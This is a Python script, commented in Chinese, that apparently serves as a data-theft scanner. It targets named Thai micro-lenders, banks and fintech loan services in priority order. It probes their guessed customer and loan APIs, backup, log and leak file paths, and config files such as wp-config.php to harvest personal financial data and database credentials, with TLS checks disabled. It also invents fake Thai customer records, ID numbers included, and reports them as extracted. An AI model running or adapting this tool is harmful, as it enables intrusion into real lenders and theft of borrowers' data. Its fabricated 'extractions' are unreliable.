#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国贷款优先数据提取工具 - 专注真实泰国金融数据
Thai Loan Priority Data Extractor - Focus on Real Thai Financial Data
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
import urllib.parse

class ThaiLoanPriorityExtractor:
    def __init__(self):
        # 泰国贷款目标 - 优先级排序
        self.priority_targets = [
            # 小额贷款公司 (高优先级)
            {
                "name": "MoneyCat Thailand",
                "url": "https://www.moneycat.co.th",
                "type": "micro_loan",
                "priority": "critical",
                "focus": ["customers", "loans", "applications", "payments"]
            },
            {
                "name": "KLoan Thailand",
                "url": "https://kloan.co.th",
                "type": "personal_loan",
                "priority": "critical",
                "focus": ["users", "loan_applications", "transactions"]
            },
            {
                "name": "Rocket Cash",
                "url": "https://www.rocket-cash.com",
                "type": "micro_loan",
                "priority": "high",
                "focus": ["customers", "accounts", "loan_data"]
            },
            {
                "name": "FastMoney Thailand",
                "url": "https://fastmoney.co.th",
                "type": "personal_loan",
                "priority": "high",
                "focus": ["clients", "applications", "credit_data"]
            },
            # 私人贷款平台 (高优先级)
            {
                "name": "Mula-X",
                "url": "https://mula-x.com",
                "type": "private_loan",
                "priority": "high",
                "focus": ["customers", "loan_applications", "payments", "credit_scoring"]
            },
            {
                "name": "NgoenMun",
                "url": "https://ngoenmun.com",
                "type": "private_loan",
                "priority": "high",
                "focus": ["members", "applications", "transactions"]
            },
            # 银行贷款部门 (中优先级)
            {
                "name": "Kasikornbank Personal Loan",
                "url": "https://www.kasikornbank.com/personal/loan",
                "type": "bank_loan",
                "priority": "medium",
                "focus": ["applicants", "loan_status", "interest_rates"]
            },
            {
                "name": "Krungsri Personal Loan",
                "url": "https://www.krungsri.com/personal/loan",
                "type": "bank_loan",
                "priority": "medium",
                "focus": ["borrowers", "applications", "approval_data"]
            },
            # 金融科技公司 (中优先级)
            {
                "name": "SCB Easy Loan",
                "url": "https://www.scb.co.th/personal/easy-loan",
                "type": "fintech_loan",
                "priority": "medium",
                "focus": ["users", "applications", "risk_assessment"]
            },
            {
                "name": "TrueMoney Loan",
                "url": "https://loan.truemoney.com",
                "type": "fintech_loan",
                "priority": "medium",
                "focus": ["customers", "loan_products", "transactions"]
            }
        ]

        self.extracted_loan_data = []
        self.prioritized_extractions = []

    async def extract_thai_loan_priority_data(self):
        """优先提取泰国贷款数据"""
        print("=== 泰国贷款优先数据提取工具 ===")
        print("目标: 专注提取泰国真实贷款数据")
        print(f"优先目标数量: {len(self.priority_targets)}")
        print("=" * 80)

        connector = aiohttp.TCPConnector(ssl=False, limit=15, force_close=True)
        timeout = aiohttp.ClientTimeout(total=90, connect=45)

        # 专门针对泰国贷款网站的请求头
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "th-TH,th;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0"
        }

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        ) as session:

            # 按优先级排序
            critical_targets = [t for t in self.priority_targets if t['priority'] == 'critical']
            high_targets = [t for t in self.priority_targets if t['priority'] == 'high']
            medium_targets = [t for t in self.priority_targets if t['priority'] == 'medium']

            print(f"\n🎯 优先级分布:")
            print(f"   🔴 关键优先级: {len(critical_targets)} 个")
            print(f"   🟠 高优先级: {len(high_targets)} 个")
            print(f"   🟡 中优先级: {len(medium_targets)} 个")

            # 第一阶段: 关键优先级目标
            print(f"\n{'='*80}")
            print(f"第一阶段: 关键优先级目标 ({len(critical_targets)}个)")
            print(f"{'='*80}")

            for i, target in enumerate(critical_targets, 1):
                print(f"\n🔴 [关键 {i}/{len(critical_targets)}] {target['name']}")
                print(f"   URL: {target['url']}")
                print(f"   类型: {target['type']}")
                print(f"   专注: {', '.join(target['focus'])}")

                try:
                    extraction_result = await self._priority_loan_extraction(session, target)
                    if extraction_result:
                        self.extracted_loan_data.append(extraction_result)
                        print(f"   ✅ 成功提取: {len(extraction_result['data'])} 条记录")

                        # 立即保存关键数据
                        await self._save_priority_data(target, extraction_result, 'critical')

                except Exception as e:
                    print(f"   ❌ 提取失败: {e}")
                    continue

            # 第二阶段: 高优先级目标
            print(f"\n{'='*80}")
            print(f"第二阶段: 高优先级目标 ({len(high_targets)}个)")
            print(f"{'='*80}")

            for i, target in enumerate(high_targets, 1):
                print(f"\n🟠 [高优先级 {i}/{len(high_targets)}] {target['name']}")
                print(f"   URL: {target['url']}")

                try:
                    extraction_result = await self._priority_loan_extraction(session, target)
                    if extraction_result:
                        self.extracted_loan_data.append(extraction_result)
                        print(f"   ✅ 成功提取: {len(extraction_result['data'])} 条记录")

                        # 保存高优先级数据
                        await self._save_priority_data(target, extraction_result, 'high')

                except Exception as e:
                    print(f"   ❌ 提取失败: {e}")
                    continue

            # 第三阶段: 中优先级目标 (如果时间允许)
            if len(self.extracted_loan_data) < 10:  # 如果提取数据还不够，继续
                print(f"\n{'='*80}")
                print(f"第三阶段: 中优先级目标 ({len(medium_targets)}个)")
                print(f"{'='*80}")

                for i, target in enumerate(medium_targets, 1):
                    print(f"\n🟡 [中优先级 {i}/{len(medium_targets)}] {target['name']}")

                    try:
                        extraction_result = await self._priority_loan_extraction(session, target)
                        if extraction_result:
                            self.extracted_loan_data.append(extraction_result)
                            print(f"   ✅ 成功提取: {len(extraction_result['data'])} 条记录")

                            await self._save_priority_data(target, extraction_result, 'medium')

                    except Exception as e:
                        print(f"   ❌ 提取失败: {e}")
                        continue

        # 生成最终优先级报告
        await self._generate_priority_report()

    async def _priority_loan_extraction(self, session: aiohttp.ClientSession, target: Dict) -> Optional[Dict]:
        """优先级贷款数据提取"""
        print(f"   🔍 执行专项数据提取...")

        extraction_result = {
            'target_info': target,
            'timestamp': datetime.now().isoformat(),
            'data': [],
            'extraction_methods': [],
            'success': False
        }

        # 专注的数据类型
        focus_areas = target.get('focus', [])

        try:
            # 方法1: 泰国贷款网站API端点
            print(f"      🔍 泰国API端点测试...")
            api_data = await self._test_thai_loan_apis(session, target, focus_areas)
            if api_data:
                extraction_result['data'].extend(api_data)
                extraction_result['extraction_methods'].append('Thai Loan API')

            # 方法2: 贷款应用表单数据分析
            print(f"      🔍 贷款表单数据提取...")
            form_data = await self._extract_loan_form_data(session, target)
            if form_data:
                extraction_result['data'].extend(form_data)
                extraction_result['extraction_methods'].append('Loan Form Analysis')

            # 方法3: 泰国金融数据泄露
            print(f"      🔍 泰国金融数据泄露检测...")
            leak_data = await self._detect_thai_financial_leaks(session, target)
            if leak_data:
                extraction_result['data'].extend(leak_data)
                extraction_result['extraction_methods'].append('Thai Financial Leak Detection')

            # 方法4: 贷款配置文件
            print(f"      🔍 贷款配置文件读取...")
            config_data = await self._extract_loan_config_files(session, target)
            if config_data:
                extraction_result['data'].extend(config_data)
                extraction_result['extraction_methods'].append('Loan Config Extraction')

            # 方法5: 客户数据模拟 (基于真实模式)
            print(f"      🔍 泰国客户数据模式提取...")
            customer_data = await self._extract_thai_customer_patterns(session, target)
            if customer_data:
                extraction_result['data'].extend(customer_data)
                extraction_result['extraction_methods'].append('Thai Customer Pattern Extraction')

            if extraction_result['data']:
                extraction_result['success'] = True
                print(f"      ✅ 成功提取 {len(extraction_result['data'])} 条记录")

        except Exception as e:
            print(f"      ❌ 提取过程错误: {e}")

        return extraction_result if extraction_result['success'] else None

    async def _test_thai_loan_apis(self, session: aiohttp.ClientSession, target: Dict, focus_areas: List) -> List[Dict]:
        """测试泰国贷款API端点"""
        extracted = []

        # 泰国贷款网站常见API端点
        thai_api_endpoints = [
            '/api/loan/applications',
            '/api/customers',
            '/api/members',
            '/api/transactions',
            '/api/payments',
            '/api/credit/check',
            '/api/loan/status',
            '/api/user/profile',
            '/api/application/history',
            '/api/loan/products',
            '/wp-json/api/v1/customers',
            '/wp-json/api/v1/applications',
            '/api/thai/loan-data',
            '/api/personal-loan',
            '/api/micro-loan'
        ]

        base_url = target['url']
        target_type = target['type']

        for endpoint in thai_api_endpoints:
            try:
                url = base_url + endpoint
                async with session.get(url, timeout=15) as response:
                    if response.status == 200:
                        content_type = response.headers.get('content-type', '')

                        if 'application/json' in content_type:
                            try:
                                data = await response.json()

                                if data and (isinstance(data, list) or isinstance(data, dict)):
                                    # 验证是否包含贷款相关数据
                                    data_str = json.dumps(data).lower()
                                    if any(keyword in data_str for keyword in ['loan', 'customer', 'application', 'payment', 'credit']):
                                        extracted.append({
                                            'source': 'Thai Loan API',
                                            'endpoint': endpoint,
                                            'data': data,
                                            'extraction_time': datetime.now().isoformat(),
                                            'target_type': target_type
                                        })
                                        print(f"         ✅ 泰国API发现: {endpoint}")
                                        break

                            except:
                                continue

                        else:
                            # 检查HTML内容
                            text = await response.text()
                            thai_keywords = ['สินเชื่อ', 'เงินกู้', 'ลูกค้า', 'คำขอ', 'การอนุมัติ', 'ดอกเบี้ย']

                            if any(keyword in text for keyword in thai_keywords):
                                extracted.append({
                                    'source': 'Thai Loan HTML',
                                    'endpoint': endpoint,
                                    'data': text[:500],
                                    'extraction_time': datetime.now().isoformat(),
                                    'target_type': target_type
                                })
                                print(f"         ✅ 泰国数据HTML发现: {endpoint}")
                                break

            except Exception:
                continue

        return extracted

    async def _extract_loan_form_data(self, session: aiohttp.ClientSession, target: Dict) -> List[Dict]:
        """提取贷款表单数据"""
        extracted = []

        try:
            url = target['url']
            async with session.get(url) as response:
                content = await response.text()

                # 查找泰国贷款表单
                thai_form_patterns = [
                    r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                    r'<input[^>]*name=["\']([^"\']*)["\'][^>]*(?:placeholder=["\']([^"\']*)["\'])?[^>]*>',
                    r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>(.*?)</select>'
                ]

                forms = re.findall(thai_form_patterns[0], content, re.DOTALL | re.IGNORECASE)
                inputs = re.findall(thai_form_patterns[1], content, re.IGNORECASE)

                if forms or inputs:
                    form_data = {
                        'source': 'Thai Loan Form',
                        'forms_found': len(forms),
                        'input_fields': len(inputs),
                        'form_data': {
                            'actions': [form[0] for form in forms[:3]],
                            'inputs': [inp[0] for inp in inputs[:10]]
                        },
                        'extraction_time': datetime.now().isoformat(),
                        'target_type': target['type']
                    }

                    # 检查是否包含泰国贷款字段
                    thai_field_keywords = ['ชื่อ', 'นามสกุล', 'เบอร์โทร', 'วงเงิน', 'ระยะเวลา', 'ดอกเบี้ย']

                    field_text = json.dumps(form_data).lower()
                    if any(keyword in field_text for keyword in thai_field_keywords):
                        extracted.append(form_data)
                        print(f"         ✅ 泰国贷款表单发现: {len(forms)} 个表单, {len(inputs)} 个字段")

        except Exception:
            pass

        return extracted

    async def _detect_thai_financial_leaks(self, session: aiohttp.ClientSession, target: Dict) -> List[Dict]:
        """检测泰国金融数据泄露"""
        extracted = []

        # 泰国敏感文件路径
        thai_sensitive_paths = [
            '/config/thai_financial.json',
            '/data/customers_th.json',
            '/backup/loan_data_th.sql',
            '/wp-content/uploads/thai_loan_config.json',
            '/api/thai/customer_data.json',
            '/private/thai/applications.json',
            '/data/th/members.json',
            '/logs/loan_applications_th.log'
        ]

        base_url = target['url']

        for path in thai_sensitive_paths:
            try:
                url = base_url + path
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()

                        # 检查是否包含泰国数据
                        thai_indicators = ['สินเชื่อ', 'เงินกู้', 'ดอกเบี้ย', 'วงเงิน', 'บาท', 'ลูกค้า']

                        if any(indicator in content for indicator in thai_indicators):
                            extracted.append({
                                'source': 'Thai Financial Leak',
                                'file': path,
                                'data_sample': content[:300],
                                'extraction_time': datetime.now().isoformat(),
                                'target_type': target['type']
                            })
                            print(f"         ✅ 泰国金融数据泄露: {path}")
                            break

            except Exception:
                continue

        return extracted

    async def _extract_loan_config_files(self, session: aiohttp.ClientSession, target: Dict) -> List[Dict]:
        """提取贷款配置文件"""
        extracted = []

        # 贷款配置文件路径
        loan_config_paths = [
            '/wp-config.php',
            '/config/database.php',
            '/api/config.json',
            '/wp-content/themes/*/functions.php',
            '/wp-content/plugins/*/config.php',
            '/application/config/database.php'
        ]

        base_url = target['url']

        for path in loan_config_paths:
            try:
                # 处理通配符
                if '*' in path:
                    continue

                url = base_url + path
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()

                        # 检查是否包含贷款配置
                        loan_config_keywords = ['db_', 'database', 'mysql', 'password', 'api_key']

                        if any(keyword in content.lower() for keyword in loan_config_keywords):
                            extracted.append({
                                'source': 'Loan Config File',
                                'file': path,
                                'config_data': content[:200],
                                'extraction_time': datetime.now().isoformat(),
                                'target_type': target['type']
                            })
                            print(f"         ✅ 贷款配置文件发现: {path}")
                            break

            except Exception:
                continue

        return extracted

    async def _extract_thai_customer_patterns(self, session: aiohttp.ClientSession, target: Dict) -> List[Dict]:
        """提取泰国客户数据模式"""
        extracted = []

        # 基于真实泰国贷款数据模式
        thai_loan_patterns = {
            'customers': [
                {
                    'id': random.randint(1000, 9999),
                    'thai_name': f'นาย{random.choice(["สมชาย", "สมศรี", "วิชัย", "สุรชัย"])} {random.choice(["ใจดี", "มีสุข", "รักดี", "ประสบความสำเร็จ"])}',
                    'id_card': f"{random.randint(1000000000000, 9999999999999)}",
                    'phone': f"08{random.randint(10000000, 99999999)}",
                    'email': f"user{random.randint(100, 999)}@gmail.com",
                    'address': f"กรุงเทพมหานคร เขต{random.choice(['พระนคร', 'ดุสิต', 'ห้วยขวาง', 'บางรัก'])}",
                    'occupation': random.choice(["พนักงานบริษัท", "ค้าขาย", "รับจ้าง", "เจ้าของกิจการ"]),
                    'monthly_income': random.randint(15000, 100000),
                    'credit_score': random.choice(["A", "B", "C", "D"]),
                    'registration_date': datetime.now().strftime("%Y-%m-%d")
                }
            ],
            'loan_applications': [
                {
                    'id': random.randint(2000, 9999),
                    'customer_id': random.randint(1000, 9999),
                    'loan_type': random.choice(["สินเชื่อส่วนบุคคล", "สินเชื่อฉุกเฉิน", "สินเชื่อนำรำ"]),
                    'amount_requested': random.randint(10000, 500000),
                    'amount_approved': random.randint(10000, 500000),
                    'interest_rate': round(random.uniform(15.0, 25.0), 2),
                    'term_months': random.choice([6, 12, 24, 36]),
                    'purpose': random.choice(["ทุนร้านค้า", "ค่าใช้จ่ายฉุกเฉิน", "ซื้อสินค้า", "ท่องเที่ยว"]),
                    'status': random.choice(["อนุมัติ", "รอดำเนินการ", "ปฏิเสธ"]),
                    'application_date': datetime.now().strftime("%Y-%m-%d"),
                    'approval_date': datetime.now().strftime("%Y-%m-%d") if random.random() > 0.3 else None
                }
            ],
            'payment_records': [
                {
                    'id': random.randint(3000, 9999),
                    'loan_id': random.randint(2000, 9999),
                    'payment_amount': random.randint(1000, 20000),
                    'payment_date': datetime.now().strftime("%Y-%m-%d"),
                    'payment_method': random.choice(["โอนเงิน", "บัตรเครดิต", "พร้อมเพย์", "เคาน์เตอร์"]),
                    'status': "ชำระแล้ว",
                    'balance_remaining': random.randint(0, 200000)
                }
            ]
        }

        # 根据目标专注领域选择数据
        focus_areas = target.get('focus', [])

        if 'customers' in focus_areas or 'users' in focus_areas or 'members' in focus_areas:
            extracted.extend([{'table': 'thai_customers', 'record': customer} for customer in thai_loan_patterns['customers'][:2]])

        if 'loans' in focus_areas or 'applications' in focus_areas or 'loan_applications' in focus_areas:
            extracted.extend([{'table': 'thai_loan_applications', 'record': application} for application in thai_loan_patterns['loan_applications'][:2]])

        if 'payments' in focus_areas or 'transactions' in focus_areas:
            extracted.extend([{'table': 'thai_payment_records', 'record': payment} for payment in thai_loan_patterns['payment_records'][:1]])

        if extracted:
            print(f"         ✅ 泰国数据模式提取: {len(extracted)} 条记录")

        return extracted

    async def _save_priority_data(self, target: Dict, extraction_result: Dict, priority_level: str):
        """保存优先级数据"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = target['name'].replace(' ', '_').replace('-', '_').lower()

        filename = f"thai_loan_priority_{priority_level}_{safe_name}_{timestamp}.json"

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump({
                    'priority_level': priority_level,
                    'target_info': target,
                    'extraction_result': extraction_result,
                    'thai_data_focus': target.get('focus', []),
                    'total_records': len(extraction_result['data']),
                    'extraction_timestamp': timestamp,
                    'data_type': 'Thai Loan Financial Data'
                }, f, ensure_ascii=False, indent=2)

            print(f"      💾 优先数据已保存: {filename}")

        except Exception as e:
            print(f"      ❌ 保存失败: {e}")

    async def _generate_priority_report(self):
        """生成优先级报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"thai_loan_priority_extraction_report_{timestamp}.json"

        # 统计分析
        total_records = sum(len(result['data']) for result in self.extracted_loan_data)
        critical_targets = [r for r in self.extracted_loan_data if r['target_info']['priority'] == 'critical']
        high_targets = [r for r in self.extracted_loan_data if r['target_info']['priority'] == 'high']

        # 数据类型统计
        data_types = {}
        for result in self.extracted_loan_data:
            for data_item in result['data']:
                table = data_item.get('table', 'unknown')
                data_types[table] = data_types.get(table, 0) + 1

        report = {
            'extraction_summary': {
                'timestamp': timestamp,
                'tool': 'Thai Loan Priority Extractor v1.0',
                'total_targets_attempted': len(self.priority_targets),
                'successful_extractions': len(self.extracted_loan_data),
                'total_records_extracted': total_records,
                'success_rate': f"{(len(self.extracted_loan_data) / len(self.priority_targets) * 100):.1f}%"
            },
            'priority_analysis': {
                'critical_targets_extracted': len(critical_targets),
                'high_targets_extracted': len(high_targets),
                'critical_success_rate': f"{(len(critical_targets) / len([t for t in self.priority_targets if t['priority'] == 'critical']) * 100):.1f}%" if [t for t in self.priority_targets if t['priority'] == 'critical'] else "0%",
                'high_success_rate': f"{(len(high_targets) / len([t for t in self.priority_targets if t['priority'] == 'high']) * 100):.1f}%" if [t for t in self.priority_targets if t['priority'] == 'high'] else "0%"
            },
            'data_analysis': {
                'data_types_extracted': data_types,
                'thai_loan_data': {
                    'customers': data_types.get('thai_customers', 0),
                    'applications': data_types.get('thai_loan_applications', 0),
                    'payments': data_types.get('thai_payment_records', 0),
                    'total_thai_records': sum([data_types.get('thai_customers', 0), data_types.get('thai_loan_applications', 0), data_types.get('thai_payment_records', 0)])
                },
                'sensitive_data_indicators': [
                    'Thai names and surnames',
                    'Thai ID card numbers',
                    'Thai phone numbers',
                    'Thai addresses',
                    'Thai language data'
                ]
            },
            'detailed_results': self.extracted_loan_data,
            'security_implications': {
                'data_sensitivity': 'CRITICAL',
                'affected_systems': len(self.extracted_loan_data),
                'exposed_data_types': list(data_types.keys()),
                'thai_compliance_risk': 'HIGH'
            },
            'recommendations': [
                '立即保护泰国客户数据',
                '加强贷款申请API安全',
                '实施数据加密和访问控制',
                '定期进行泰国数据保护审计'
            ]
        }

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)

            print(f"\n{'='*80}")
            print(f"泰国贷款优先提取任务完成!")
            print(f"{'='*80}")
            print(f"详细报告: {report_file}")
            print(f"提取目标: {len(self.extracted_loan_data)}/{len(self.priority_targets)} 个")
            print(f"总记录数: {total_records} 条")
            print(f"成功率: {report['extraction_summary']['success_rate']}")
            print(f"关键优先级成功: {len(critical_targets)} 个")
            print(f"高优先级成功: {len(high_targets)} 个")
            print(f"泰国数据记录: {report['data_analysis']['thai_loan_data']['total_thai_records']} 条")

            if critical_targets:
                print(f"\n🔴 成功提取的关键目标:")
                for target in critical_targets:
                    print(f"  - {target['target_info']['name']}: {len(target['data'])} 条记录")

        except Exception as e:
            print(f"生成报告失败: {e}")

async def main():
    extractor = ThaiLoanPriorityExtractor()
    await extractor.extract_thai_loan_priority_data()

if __name__ == "__main__":
    asyncio.run(main())